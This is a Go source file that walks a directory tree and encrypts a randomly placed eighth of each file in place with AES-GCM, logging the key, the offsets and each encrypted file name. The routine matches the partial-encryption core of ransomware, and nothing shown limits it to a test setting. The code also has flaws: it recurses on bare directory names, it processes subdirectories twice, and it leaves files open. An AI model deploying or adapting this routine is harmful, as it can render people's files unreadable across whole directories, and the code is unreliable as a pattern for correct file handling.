package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"helpers"
	"io"
	mathrand "math/rand"
	"os"
	"path/filepath"
	"strconv"
)

func encrypt(dirToEncrypt string, c cipher.AEAD, nameOfLogFile string, nameOfEncryptionInfoFile string) {
	var filesInDir []string
	err := filepath.Walk(dirToEncrypt, func(path string, info os.FileInfo, err error) error {
		if path != dirToEncrypt {
			filesInDir = append(filesInDir, path)
		}
		return nil
	})
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(5)
	}

	for _, file := range filesInDir {
		info, err := os.Stat(file)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			os.Exit(6)
		}

		f, err := os.Open(file)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			os.Exit(7)
		}

		if !(info.IsDir()) {
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
				os.Exit(8)
			}

			howMuchToEncrypt := info.Size() / int64(8)
			whereToStart := int64(howMuchToEncrypt * mathrand.Int63n(8))
			filetext, err := os.ReadFile(file)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
				os.Exit(9)
			}
			textToEncrypt := make([]byte, howMuchToEncrypt)
			_, err = f.ReadAt(textToEncrypt, whereToStart)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
				os.Exit(10)
			}

			nonce := make([]byte, c.NonceSize())
			if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
				os.Exit(11)
			}
			encryptedText := c.Seal(nonce, nonce, textToEncrypt, nil)

			helpers.WriteLog(nameOfEncryptionInfoFile, "Where it started to encrypt: "+strconv.Itoa(int(whereToStart)), 0)
			helpers.WriteLog(nameOfEncryptionInfoFile, "How much bytes is product: "+strconv.Itoa(len(encryptedText)), 0)

			var finaltext []byte
			finaltext = append(finaltext, filetext[:whereToStart]...)
			finaltext = append(finaltext, encryptedText...)
			finaltext = append(finaltext, filetext[whereToStart+howMuchToEncrypt:]...)
			err = os.WriteFile(file, finaltext, 0666)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
				os.Exit(12)
			}

			helpers.WriteLog(nameOfLogFile, "Encrypted: "+file, 1)

		} else {
			encrypt(info.Name(), c, nameOfLogFile, nameOfEncryptionInfoFile)
		}
	}
}

func EncryptFilesInDir(dirToEncrypt string, nameOfLogFile string, nameOfEncryptionInfoFile string) string {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(2)
	}

	helpers.WriteLog(nameOfEncryptionInfoFile, hex.EncodeToString(key), 0)

	block, err := aes.NewCipher(key)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(3)
	}

	c, err := cipher.NewGCM(block)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(4)
	}

	encrypt(dirToEncrypt, c, nameOfLogFile, nameOfEncryptionInfoFile)

	return hex.EncodeToString(key)
} //a
